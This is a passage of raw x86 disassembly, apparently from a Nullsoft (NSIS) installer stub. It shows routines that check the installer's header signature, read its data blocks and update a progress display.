  402b86:	00 59 22             	add    %bl,0x22(%ecx)
  402b89:	40                   	inc    %eax
  402b8a:	00 dd                	add    %bl,%ch
  402b8c:	22 40 00             	and    0x0(%eax),%al
  402b8f:	0c 23                	or     $0x23,%al
  402b91:	40                   	inc    %eax
  402b92:	00 4e 23             	add    %cl,0x23(%esi)
  402b95:	40                   	inc    %eax
  402b96:	00 8e 23 40 00 e4    	add    %cl,-0x1bffbfdd(%esi)
  402b9c:	23 40 00             	and    0x0(%eax),%eax
  402b9f:	84 24 40             	test   %ah,(%eax,%eax,2)
  402ba2:	00 f8                	add    %bh,%al
  402ba4:	24 40                	and    $0x40,%al
  402ba6:	00 62 25             	add    %ah,0x25(%edx)
  402ba9:	40                   	inc    %eax
  402baa:	00 76 25             	add    %dh,0x25(%esi)
  402bad:	40                   	inc    %eax
  402bae:	00 98 25 40 00 4a    	add    %bl,0x4a004025(%eax)
  402bb4:	26 40                	es inc %eax
  402bb6:	00 ed                	add    %ch,%ch
  402bb8:	27                   	daa
  402bb9:	40                   	inc    %eax
  402bba:	00 21                	add    %ah,(%ecx)
  402bbc:	28 40 00             	sub    %al,0x0(%eax)
  402bbf:	3b 28                	cmp    (%eax),%ebp
  402bc1:	40                   	inc    %eax
  402bc2:	00 68 28             	add    %ch,0x28(%eax)
  402bc5:	40                   	inc    %eax
  402bc6:	00 ad 28 40 00 a8    	add    %ch,-0x57ffbfd8(%ebp)
  402bcc:	29 40 00             	sub    %eax,0x0(%eax)
  402bcf:	35 2a 40 00 c5       	xor    $0xc500402a,%eax
  402bd4:	2a 40 00             	sub    0x0(%eax),%al
  402bd7:	c5 2a                	lds    (%edx),%ebp
  402bd9:	40                   	inc    %eax
  402bda:	00 a0 2a 40 00 98    	add    %ah,-0x67ffbfd6(%eax)
  402be0:	25 40 00 4a 26       	and    $0x264a0040,%eax
  402be5:	40                   	inc    %eax
  402be6:	00 de                	add    %bl,%dh
  402be8:	1a 40 00             	sbb    0x0(%eax),%al
  402beb:	e2 1a                	loop   0x402c07
  402bed:	40                   	inc    %eax
  402bee:	00 e6                	add    %ah,%dh
  402bf0:	1a 40 00             	sbb    0x0(%eax),%al
  402bf3:	eb 1a                	jmp    0x402c0f
  402bf5:	40                   	inc    %eax
  402bf6:	00 f8                	add    %bh,%al
  402bf8:	1a 40 00             	sbb    0x0(%eax),%al
  402bfb:	fc                   	cld
  402bfc:	1a 40 00             	sbb    0x0(%eax),%al
  402bff:	00 1b                	add    %bl,(%ebx)
  402c01:	40                   	inc    %eax
  402c02:	00 06                	add    %al,(%esi)
  402c04:	1b 40 00             	sbb    0x0(%eax),%eax
  402c07:	0f 1b 40 00          	bndstx %bnd0,0x0(%eax)
  402c0b:	19 1b                	sbb    %ebx,(%ebx)
  402c0d:	40                   	inc    %eax
  402c0e:	00 26                	add    %ah,(%esi)
  402c10:	1b 40 00             	sbb    0x0(%eax),%eax
  402c13:	3e 1b 40 00          	sbb    %ds:0x0(%eax),%eax
  402c17:	42                   	inc    %edx
  402c18:	1b 40 00             	sbb    0x0(%eax),%eax
  402c1b:	46                   	inc    %esi
  402c1c:	1b 40 00             	sbb    0x0(%eax),%eax
  402c1f:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c23:	8b 0d 2c e6 41 00    	mov    0x41e62c,%ecx
  402c29:	56                   	push   %esi
  402c2a:	ff 34 81             	push   (%ecx,%eax,4)
  402c2d:	6a 00                	push   $0x0
  402c2f:	e8 a8 36 00 00       	call   0x4062dc
  402c34:	8b f0                	mov    %eax,%esi
  402c36:	56                   	push   %esi
  402c37:	e8 de 35 00 00       	call   0x40621a
  402c3c:	0f b7 16             	movzwl (%esi),%edx
  402c3f:	5e                   	pop    %esi
  402c40:	c3                   	ret
  402c41:	56                   	push   %esi
  402c42:	8b 74 24 08          	mov    0x8(%esp),%esi
  402c46:	85 f6                	test   %esi,%esi
  402c48:	57                   	push   %edi
  402c49:	8b c6                	mov    %esi,%eax
  402c4b:	7d 02                	jge    0x402c4f
  402c4d:	f7 d8                	neg    %eax
  402c4f:	8b 15 2c e6 41 00    	mov    0x41e62c,%edx
  402c55:	8b c8                	mov    %eax,%ecx
  402c57:	83 e1 0f             	and    $0xf,%ecx
  402c5a:	c1 f8 04             	sar    $0x4,%eax
  402c5d:	ff 34 8a             	push   (%edx,%ecx,4)
  402c60:	c1 e0 0e             	shl    $0xe,%eax
  402c63:	05 d0 a5 40 00       	add    $0x40a5d0,%eax
  402c68:	50                   	push   %eax
  402c69:	e8 6e 36 00 00       	call   0x4062dc
  402c6e:	85 f6                	test   %esi,%esi
  402c70:	8b f8                	mov    %eax,%edi
  402c72:	7d 06                	jge    0x402c7a
  402c74:	57                   	push   %edi
  402c75:	e8 d4 38 00 00       	call   0x40654e
  402c7a:	8b c7                	mov    %edi,%eax
  402c7c:	5f                   	pop    %edi
  402c7d:	5e                   	pop    %esi
  402c7e:	c2 04 00             	ret    $0x4
  402c81:	55                   	push   %ebp
  402c82:	8b ec                	mov    %esp,%ebp
  402c84:	8d 45 08             	lea    0x8(%ebp),%eax
  402c87:	50                   	push   %eax
  402c88:	8b 45 08             	mov    0x8(%ebp),%eax
  402c8b:	0d 20 00 10 00       	or     $0x100020,%eax
  402c90:	50                   	push   %eax
  402c91:	6a 22                	push   $0x22
  402c93:	e8 a9 ff ff ff       	call   0x402c41
  402c98:	50                   	push   %eax
  402c99:	a1 2c e6 41 00       	mov    0x41e62c,%eax
  402c9e:	ff 70 04             	push   0x4(%eax)
  402ca1:	e8 13 00 00 00       	call   0x402cb9
  402ca6:	50                   	push   %eax
  402ca7:	e8 7b 34 00 00       	call   0x406127
  402cac:	f7 d8                	neg    %eax
  402cae:	1b c0                	sbb    %eax,%eax
  402cb0:	f7 d0                	not    %eax
  402cb2:	23 45 08             	and    0x8(%ebp),%eax
  402cb5:	5d                   	pop    %ebp
  402cb6:	c2 04 00             	ret    $0x4
  402cb9:	8b 44 24 04          	mov    0x4(%esp),%eax
  402cbd:	85 c0                	test   %eax,%eax
  402cbf:	7c 0d                	jl     0x402cce
  402cc1:	8b 0d 84 af 47 00    	mov    0x47af84,%ecx
  402cc7:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402cce:	c2 04 00             	ret    $0x4
  402cd1:	55                   	push   %ebp
  402cd2:	8b ec                	mov    %esp,%ebp
  402cd4:	8d 45 10             	lea    0x10(%ebp),%eax
  402cd7:	50                   	push   %eax
  402cd8:	8b 45 10             	mov    0x10(%ebp),%eax
  402cdb:	0d 20 00 10 00       	or     $0x100020,%eax
  402ce0:	50                   	push   %eax
  402ce1:	ff 75 0c             	push   0xc(%ebp)
  402ce4:	ff 75 08             	push   0x8(%ebp)
  402ce7:	e8 cd ff ff ff       	call   0x402cb9
  402cec:	50                   	push   %eax
  402ced:	e8 63 34 00 00       	call   0x406155
  402cf2:	f7 d8                	neg    %eax
  402cf4:	1b c0                	sbb    %eax,%eax
  402cf6:	f7 d0                	not    %eax
  402cf8:	23 45 10             	and    0x10(%ebp),%eax
  402cfb:	5d                   	pop    %ebp
  402cfc:	c2 0c 00             	ret    $0xc
  402cff:	55                   	push   %ebp
  402d00:	8b ec                	mov    %esp,%ebp
  402d02:	56                   	push   %esi
  402d03:	8b 75 0c             	mov    0xc(%ebp),%esi
  402d06:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402d0a:	75 07                	jne    0x402d13
  402d0c:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402d11:	eb 2c                	jmp    0x402d3f
  402d13:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402d1a:	8d 45 10             	lea    0x10(%ebp),%eax
  402d1d:	50                   	push   %eax
  402d1e:	ff 75 08             	push   0x8(%ebp)
  402d21:	e8 93 ff ff ff       	call   0x402cb9
  402d26:	50                   	push   %eax
  402d27:	e8 80 33 00 00       	call   0x4060ac
  402d2c:	85 c0                	test   %eax,%eax
  402d2e:	74 0c                	je     0x402d3c
  402d30:	ff 75 10             	push   0x10(%ebp)
  402d33:	56                   	push   %esi
  402d34:	50                   	push   %eax
  402d35:	e8 0a 00 00 00       	call   0x402d44
  402d3a:	eb 03                	jmp    0x402d3f
  402d3c:	6a 06                	push   $0x6
  402d3e:	58                   	pop    %eax
  402d3f:	5e                   	pop    %esi
  402d40:	5d                   	pop    %ebp
  402d41:	c2 0c 00             	ret    $0xc
  402d44:	55                   	push   %ebp
  402d45:	8b ec                	mov    %esp,%ebp
  402d47:	81 ec 10 02 00 00    	sub    $0x210,%esp
  402d4d:	53                   	push   %ebx
  402d4e:	56                   	push   %esi
  402d4f:	8b 75 10             	mov    0x10(%ebp),%esi
  402d52:	57                   	push   %edi
  402d53:	8b fe                	mov    %esi,%edi
  402d55:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402d58:	81 e6 00 03 00 00    	and    $0x300,%esi
  402d5e:	50                   	push   %eax
  402d5f:	8b c6                	mov    %esi,%eax
  402d61:	83 e7 01             	and    $0x1,%edi
  402d64:	0c 08                	or     $0x8,%al
  402d66:	50                   	push   %eax
  402d67:	ff 75 0c             	push   0xc(%ebp)
  402d6a:	ff 75 08             	push   0x8(%ebp)
  402d6d:	e8 b5 33 00 00       	call   0x406127
  402d72:	85 c0                	test   %eax,%eax
  402d74:	75 76                	jne    0x402dec
  402d76:	8b 1d 30 80 40 00    	mov    0x408030,%ebx
  402d7c:	eb 1a                	jmp    0x402d98
  402d7e:	85 ff                	test   %edi,%edi
  402d80:	75 4e                	jne    0x402dd0
  402d82:	ff 75 10             	push   0x10(%ebp)
  402d85:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402d8b:	50                   	push   %eax
  402d8c:	ff 75 fc             	push   -0x4(%ebp)
  402d8f:	e8 b0 ff ff ff       	call   0x402d44
  402d94:	85 c0                	test   %eax,%eax
  402d96:	75 17                	jne    0x402daf
  402d98:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402d9e:	68 05 01 00 00       	push   $0x105
  402da3:	50                   	push   %eax
  402da4:	6a 00                	push   $0x0
  402da6:	ff 75 fc             	push   -0x4(%ebp)
  402da9:	ff d3                	call   *%ebx
  402dab:	85 c0                	test   %eax,%eax
  402dad:	74 cf                	je     0x402d7e
  402daf:	ff 75 fc             	push   -0x4(%ebp)
  402db2:	ff 15 24 80 40 00    	call   *0x408024
  402db8:	6a 03                	push   $0x3
  402dba:	e8 d5 38 00 00       	call   0x406694
  402dbf:	85 c0                	test   %eax,%eax
  402dc1:	74 1d                	je     0x402de0
  402dc3:	6a 00                	push   $0x0
  402dc5:	56                   	push   %esi
  402dc6:	ff 75 0c             	push   0xc(%ebp)
  402dc9:	ff 75 08             	push   0x8(%ebp)
  402dcc:	ff d0                	call   *%eax
  402dce:	eb 1c                	jmp    0x402dec
  402dd0:	ff 75 fc             	push   -0x4(%ebp)
  402dd3:	ff 15 24 80 40 00    	call   *0x408024
  402dd9:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402dde:	eb 0c                	jmp    0x402dec
  402de0:	ff 75 0c             	push   0xc(%ebp)
  402de3:	ff 75 08             	push   0x8(%ebp)
  402de6:	ff 15 1c 80 40 00    	call   *0x40801c
  402dec:	5f                   	pop    %edi
  402ded:	5e                   	pop    %esi
  402dee:	5b                   	pop    %ebx
  402def:	c9                   	leave
  402df0:	c2 0c 00             	ret    $0xc
  402df3:	55                   	push   %ebp
  402df4:	8b ec                	mov    %esp,%ebp
  402df6:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402dfc:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402e03:	75 19                	jne    0x402e1e
  402e05:	6a 00                	push   $0x0
  402e07:	68 fa 00 00 00       	push   $0xfa
  402e0c:	6a 01                	push   $0x1
  402e0e:	ff 75 08             	push   0x8(%ebp)
  402e11:	ff 15 58 82 40 00    	call   *0x408258
  402e17:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402e1e:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402e25:	75 4c                	jne    0x402e73
  402e27:	8b 0d f8 81 42 00    	mov    0x4281f8,%ecx
  402e2d:	a1 04 42 43 00       	mov    0x434204,%eax
  402e32:	3b c8                	cmp    %eax,%ecx
  402e34:	7c 02                	jl     0x402e38
  402e36:	8b c8                	mov    %eax,%ecx
  402e38:	50                   	push   %eax
  402e39:	6a 64                	push   $0x64
  402e3b:	51                   	push   %ecx
  402e3c:	ff 15 54 81 40 00    	call   *0x408154
  402e42:	50                   	push   %eax
  402e43:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e46:	68 1c a0 40 00       	push   $0x40a01c
  402e4b:	50                   	push   %eax
  402e4c:	ff 15 90 82 40 00    	call   *0x408290
  402e52:	83 c4 0c             	add    $0xc,%esp
  402e55:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e58:	50                   	push   %eax
  402e59:	ff 75 08             	push   0x8(%ebp)
  402e5c:	ff 15 5c 82 40 00    	call   *0x40825c
  402e62:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e65:	50                   	push   %eax
  402e66:	68 06 04 00 00       	push   $0x406
  402e6b:	ff 75 08             	push   0x8(%ebp)
  402e6e:	e8 8b 2a 00 00       	call   0x4058fe
  402e73:	33 c0                	xor    %eax,%eax
  402e75:	c9                   	leave
  402e76:	c2 10 00             	ret    $0x10
  402e79:	56                   	push   %esi
  402e7a:	33 f6                	xor    %esi,%esi
  402e7c:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402e80:	74 18                	je     0x402e9a
  402e82:	a1 00 42 43 00       	mov    0x434200,%eax
  402e87:	3b c6                	cmp    %esi,%eax
  402e89:	74 07                	je     0x402e92
  402e8b:	50                   	push   %eax
  402e8c:	ff 15 50 82 40 00    	call   *0x408250
  402e92:	89 35 00 42 43 00    	mov    %esi,0x434200
  402e98:	5e                   	pop    %esi
  402e99:	c3                   	ret
  402e9a:	39 35 00 42 43 00    	cmp    %esi,0x434200
  402ea0:	74 08                	je     0x402eaa
  402ea2:	56                   	push   %esi
  402ea3:	e8 28 38 00 00       	call   0x4066d0
  402ea8:	5e                   	pop    %esi
  402ea9:	c3                   	ret
  402eaa:	ff 15 7c 80 40 00    	call   *0x40807c
  402eb0:	3b 05 f0 ae 47 00    	cmp    0x47aef0,%eax
  402eb6:	76 23                	jbe    0x402edb
  402eb8:	56                   	push   %esi
  402eb9:	68 f3 2d 40 00       	push   $0x402df3
  402ebe:	56                   	push   %esi
  402ebf:	6a 6f                	push   $0x6f
  402ec1:	ff 35 e0 ae 47 00    	push   0x47aee0
  402ec7:	ff 15 88 82 40 00    	call   *0x408288
  402ecd:	6a 05                	push   $0x5
  402ecf:	50                   	push   %eax
  402ed0:	a3 00 42 43 00       	mov    %eax,0x434200
  402ed5:	ff 15 68 82 40 00    	call   *0x408268
  402edb:	5e                   	pop    %esi
  402edc:	c3                   	ret
  402edd:	55                   	push   %ebp
  402ede:	8b ec                	mov    %esp,%ebp
  402ee0:	83 ec 28             	sub    $0x28,%esp
  402ee3:	53                   	push   %ebx
  402ee4:	56                   	push   %esi
  402ee5:	33 db                	xor    %ebx,%ebx
  402ee7:	57                   	push   %edi
  402ee8:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402eeb:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402eee:	ff 15 7c 80 40 00    	call   *0x40807c
  402ef4:	be 00 70 4e 00       	mov    $0x4e7000,%esi
  402ef9:	68 00 20 00 00       	push   $0x2000
  402efe:	05 e8 03 00 00       	add    $0x3e8,%eax
  402f03:	56                   	push   %esi
  402f04:	53                   	push   %ebx
  402f05:	a3 f0 ae 47 00       	mov    %eax,0x47aef0
  402f0a:	ff 15 84 80 40 00    	call   *0x408084
  402f10:	6a 03                	push   $0x3
  402f12:	68 00 00 00 80       	push   $0x80000000
  402f17:	56                   	push   %esi
  402f18:	e8 93 2e 00 00       	call   0x405db0
  402f1d:	8b f8                	mov    %eax,%edi
  402f1f:	83 ff ff             	cmp    $0xffffffff,%edi
  402f22:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402f25:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  402f2b:	75 0a                	jne    0x402f37
  402f2d:	b8 e8 a1 40 00       	mov    $0x40a1e8,%eax
  402f32:	e9 d8 01 00 00       	jmp    0x40310f
  402f37:	56                   	push   %esi
  402f38:	be 00 70 4d 00       	mov    $0x4d7000,%esi
  402f3d:	56                   	push   %esi
  402f3e:	e8 77 33 00 00       	call   0x4062ba
  402f43:	56                   	push   %esi
  402f44:	e8 92 2c 00 00       	call   0x405bdb
  402f49:	50                   	push   %eax
  402f4a:	68 00 b0 4e 00       	push   $0x4eb000
  402f4f:	e8 66 33 00 00       	call   0x4062ba
  402f54:	53                   	push   %ebx
  402f55:	57                   	push   %edi
  402f56:	ff 15 80 80 40 00    	call   *0x408080
  402f5c:	3b c3                	cmp    %ebx,%eax
  402f5e:	a3 04 42 43 00       	mov    %eax,0x434204
  402f63:	8b f0                	mov    %eax,%esi
  402f65:	0f 8e e7 00 00 00    	jle    0x403052
  402f6b:	bb 08 42 43 00       	mov    $0x434208,%ebx
  402f70:	a1 f8 ae 47 00       	mov    0x47aef8,%eax
  402f75:	8b fe                	mov    %esi,%edi
  402f77:	f7 d8                	neg    %eax
  402f79:	1b c0                	sbb    %eax,%eax
  402f7b:	25 00 7e 00 00       	and    $0x7e00,%eax
  402f80:	05 00 02 00 00       	add    $0x200,%eax
  402f85:	3b f0                	cmp    %eax,%esi
  402f87:	7c 02                	jl     0x402f8b
  402f89:	8b f8                	mov    %eax,%edi
  402f8b:	57                   	push   %edi
  402f8c:	53                   	push   %ebx
  402f8d:	e8 9f 03 00 00       	call   0x403331
  402f92:	85 c0                	test   %eax,%eax
  402f94:	0f 84 22 01 00 00    	je     0x4030bc
  402f9a:	83 3d f8 ae 47 00 00 	cmpl   $0x0,0x47aef8
  402fa1:	75 7a                	jne    0x40301d
  402fa3:	6a 1c                	push   $0x1c
  402fa5:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402fa8:	53                   	push   %ebx
  402fa9:	50                   	push   %eax
  402faa:	e8 bc 2d 00 00       	call   0x405d6b
  402faf:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402fb2:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402fb7:	75 72                	jne    0x40302b
  402fb9:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  402fc0:	75 69                	jne    0x40302b
  402fc2:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  402fc9:	75 60                	jne    0x40302b
  402fcb:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  402fd2:	75 57                	jne    0x40302b
  402fd4:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  402fdb:	75 4e                	jne    0x40302b
  402fdd:	09 45 08             	or     %eax,0x8(%ebp)
  402fe0:	8b 45 08             	mov    0x8(%ebp),%eax
  402fe3:	8b 0d f8 81 42 00    	mov    0x4281f8,%ecx
  402fe9:	83 e0 02             	and    $0x2,%eax
  402fec:	09 05 a0 af 47 00    	or     %eax,0x47afa0
  402ff2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402ff5:	3b c6                	cmp    %esi,%eax
  402ff7:	89 0d f8 ae 47 00    	mov    %ecx,0x47aef8
  402ffd:	0f 8f b2 00 00 00    	jg     0x4030b5
  403003:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  403007:	75 06                	jne    0x40300f
  403009:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  40300d:	75 41                	jne    0x403050
  40300f:	ff 45 fc             	incl   -0x4(%ebp)
  403012:	8d 70 fc             	lea    -0x4(%eax),%esi
  403015:	3b fe                	cmp    %esi,%edi
  403017:	76 12                	jbe    0x40302b
  403019:	8b fe                	mov    %esi,%edi
  40301b:	eb 0e                	jmp    0x40302b
  40301d:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  403021:	75 08                	jne    0x40302b
  403023:	6a 00                	push   $0x0
  403025:	e8 4f fe ff ff       	call   0x402e79
  40302a:	59                   	pop    %ecx
  40302b:	3b 35 04 42 43 00    	cmp    0x434204,%esi
  403031:	7d 0d                	jge    0x403040
  403033:	57                   	push   %edi
  403034:	53                   	push   %ebx
  403035:	ff 75 f8             	push   -0x8(%ebp)
  403038:	e8 4a 37 00 00       	call   0x406787
  40303d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403040:	01 3d f8 81 42 00    	add    %edi,0x4281f8
  403046:	2b f7                	sub    %edi,%esi
  403048:	85 f6                	test   %esi,%esi
  40304a:	0f 8f 20 ff ff ff    	jg     0x402f70
  403050:	33 db                	xor    %ebx,%ebx
  403052:	6a 01                	push   $0x1
  403054:	e8 20 fe ff ff       	call   0x402e79
  403059:	39 1d f8 ae 47 00    	cmp    %ebx,0x47aef8
  40305f:	59                   	pop    %ecx
  403060:	74 53                	je     0x4030b5
  403062:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  403065:	74 22                	je     0x403089
  403067:	ff 35 f8 81 42 00    	push   0x4281f8
  40306d:	e8 d5 02 00 00       	call   0x403347
  403072:	8d 45 08             	lea    0x8(%ebp),%eax
  403075:	6a 04                	push   $0x4
  403077:	50                   	push   %eax
  403078:	e8 b4 02 00 00       	call   0x403331
  40307d:	85 c0                	test   %eax,%eax
  40307f:	74 34                	je     0x4030b5
  403081:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403084:	3b 45 08             	cmp    0x8(%ebp),%eax
  403087:	75 2c                	jne    0x4030b5
  403089:	ff 75 ec             	push   -0x14(%ebp)
  40308c:	6a 40                	push   $0x40
  40308e:	ff 15 34 81 40 00    	call   *0x408134
  403094:	8b f0                	mov    %eax,%esi
  403096:	a1 f8 ae 47 00       	mov    0x47aef8,%eax
  40309b:	83 c0 1c             	add    $0x1c,%eax
  40309e:	50                   	push   %eax
  40309f:	e8 a3 02 00 00       	call   0x403347
  4030a4:	ff 75 ec             	push   -0x14(%ebp)
  4030a7:	56                   	push   %esi
  4030a8:	53                   	push   %ebx
  4030a9:	6a ff                	push   $0xffffffff
  4030ab:	e8 66 00 00 00       	call   0x403116
  4030b0:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4030b3:	74 11                	je     0x4030c6
  4030b5:	b8 50 a0 40 00       	mov    $0x40a050,%eax
  4030ba:	eb 53                	jmp    0x40310f
  4030bc:	6a 01                	push   $0x1
  4030be:	e8 b6 fd ff ff       	call   0x402e79
  4030c3:	59                   	pop    %ecx
  4030c4:	eb ef                	jmp    0x4030b5
  4030c6:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4030ca:	89 35 f4 ae 47 00    	mov    %esi,0x47aef4
  4030d0:	8b 06                	mov    (%esi),%eax
  4030d2:	a3 fc ae 47 00       	mov    %eax,0x47aefc
  4030d7:	74 06                	je     0x4030df
  4030d9:	ff 05 00 af 47 00    	incl   0x47af00
  4030df:	6a 08                	push   $0x8
  4030e1:	8d 46 44             	lea    0x44(%esi),%eax
  4030e4:	59                   	pop    %ecx
  4030e5:	83 e8 08             	sub    $0x8,%eax
  4030e8:	01 30                	add    %esi,(%eax)
  4030ea:	49                   	dec    %ecx
  4030eb:	75 f8                	jne    0x4030e5
  4030ed:	6a 01                	push   $0x1
  4030ef:	53                   	push   %ebx
  4030f0:	53                   	push   %ebx
  4030f1:	ff 75 f4             	push   -0xc(%ebp)
  4030f4:	ff 15 44 81 40 00    	call   *0x408144
  4030fa:	89 46 3c             	mov    %eax,0x3c(%esi)
  4030fd:	83 c6 04             	add    $0x4,%esi
  403100:	6a 40                	push   $0x40
  403102:	56                   	push   %esi
  403103:	68 20 af 47 00       	push   $0x47af20
  403108:	e8 5e 2c 00 00       	call   0x405d6b
  40310d:	33 c0                	xor    %eax,%eax
  40310f:	5f                   	pop    %edi
  403110:	5e                   	pop    %esi
  403111:	5b                   	pop    %ebx
  403112:	c9                   	leave
  403113:	c2 04 00             	ret    $0x4
  403116:	55                   	push   %ebp
  403117:	8b ec                	mov    %esp,%ebp
  403119:	81 ec 94 00 00 00    	sub    $0x94,%esp
  40311f:	53                   	push   %ebx
  403120:	56                   	push   %esi
  403121:	8b 75 14             	mov    0x14(%ebp),%esi
  403124:	57                   	push   %edi
  403125:	8b 7d 10             	mov    0x10(%ebp),%edi
  403128:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40312b:	85 ff                	test   %edi,%edi
  40312d:	75 07                	jne    0x403136
  40312f:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  403136:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40313a:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40313d:	85 ff                	test   %edi,%edi
  40313f:	75 07                	jne    0x403148
  403141:	c7 45 f4 00 c2 42 00 	movl   $0x42c200,-0xc(%ebp)
  403148:	8b 45 08             	mov    0x8(%ebp),%eax
  40314b:	85 c0                	test   %eax,%eax
  40314d:	7c 0e                	jl     0x40315d
  40314f:	8b 0d 58 af 47 00    	mov    0x47af58,%ecx
  403155:	03 c8                	add    %eax,%ecx
  403157:	51                   	push   %ecx
  403158:	e8 ea 01 00 00       	call   0x403347
  40315d:	8d 45 14             	lea    0x14(%ebp),%eax
  403160:	6a 04                	push   $0x4
  403162:	50                   	push   %eax
  403163:	e8 c9 01 00 00       	call   0x403331
  403168:	85 c0                	test   %eax,%eax
  40316a:	0f 84 af 01 00 00    	je     0x40331f
  403170:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  403174:	0f 84 50 01 00 00    	je     0x4032ca
  40317a:	8b 1d 7c 80 40 00    	mov    0x40807c,%ebx
  403180:	ff d3                	call   *%ebx
  403182:	83 25 64 eb 41 00 00 	andl   $0x0,0x41eb64
  403189:	83 25 60 eb 41 00 00 	andl   $0x0,0x41eb60
  403190:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  403197:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40319a:	b8 e8 01 42 00       	mov    $0x4201e8,%eax
  40319f:	c7 05 48 e6 41 00 08 	movl   $0x8,0x41e648
  4031a6:	00 00 00 
  4031a9:	a3 f0 81 42 00       	mov    %eax,0x4281f0
  4031ae:	a3 ec 81 42 00       	mov    %eax,0x4281ec
  4031b3:	8b 45 14             	mov    0x14(%ebp),%eax
  4031b6:	c7 05 e8 81 42 00 e8 	movl   $0x4281e8,0x4281e8
  4031bd:	81 42 00 
  4031c0:	89 45 08             	mov    %eax,0x8(%ebp)
  4031c3:	0f 8e 5e 01 00 00    	jle    0x403327
  4031c9:	be 00 40 00 00       	mov    $0x4000,%esi
  4031ce:	39 75 14             	cmp    %esi,0x14(%ebp)
  4031d1:	7d 03                	jge    0x4031d6
  4031d3:	8b 75 14             	mov    0x14(%ebp),%esi
  4031d6:	bf 00 82 42 00       	mov    $0x428200,%edi
  4031db:	56                   	push   %esi
  4031dc:	57                   	push   %edi
  4031dd:	e8 4f 01 00 00       	call   0x403331
  4031e2:	85 c0                	test   %eax,%eax
  4031e4:	0f 84 35 01 00 00    	je     0x40331f
  4031ea:	29 75 14             	sub    %esi,0x14(%ebp)
  4031ed:	89 3d 38 e6 41 00    	mov    %edi,0x41e638
  4031f3:	89 35 3c e6 41 00    	mov    %esi,0x41e63c
  4031f9:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4031fc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031ff:	68 38 e6 41 00       	push   $0x41e638
  403204:	89 3d 40 e6 41 00    	mov    %edi,0x41e640
  40320a:	a3 44 e6 41 00       	mov    %eax,0x41e644
  40320f:	e8 e1 35 00 00       	call   0x4067f5
  403214:	85 c0                	test   %eax,%eax
  403216:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403219:	0f 8c a3 00 00 00    	jl     0x4032c2
  40321f:	8b 35 40 e6 41 00    	mov    0x41e640,%esi
  403225:	2b f7                	sub    %edi,%esi
  403227:	ff d3                	call   *%ebx
  403229:	f6 05 b4 af 47 00 01 	testb  $0x1,0x47afb4
  403230:	8b f8                	mov    %eax,%edi
  403232:	74 49                	je     0x40327d
  403234:	2b 45 f0             	sub    -0x10(%ebp),%eax
  403237:	3d c8 00 00 00       	cmp    $0xc8,%eax
  40323c:	77 06                	ja     0x403244
  40323e:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403242:	75 39                	jne    0x40327d
  403244:	8b 45 08             	mov    0x8(%ebp),%eax
  403247:	ff 75 08             	push   0x8(%ebp)
  40324a:	2b 45 14             	sub    0x14(%ebp),%eax
  40324d:	6a 64                	push   $0x64
  40324f:	50                   	push   %eax
  403250:	ff 15 54 81 40 00    	call   *0x408154
  403256:	50                   	push   %eax
  403257:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40325d:	68 1c a2 40 00       	push   $0x40a21c
  403262:	50                   	push   %eax
  403263:	ff 15 90 82 40 00    	call   *0x408290
  403269:	83 c4 0c             	add    $0xc,%esp
  40326c:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403272:	50                   	push   %eax
  403273:	6a 00                	push   $0x0
  403275:	e8 a8 20 00 00       	call   0x405322
  40327a:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40327d:	85 f6                	test   %esi,%esi
  40327f:	74 35                	je     0x4032b6
  403281:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403285:	75 15                	jne    0x40329c
  403287:	56                   	push   %esi
  403288:	ff 75 f4             	push   -0xc(%ebp)
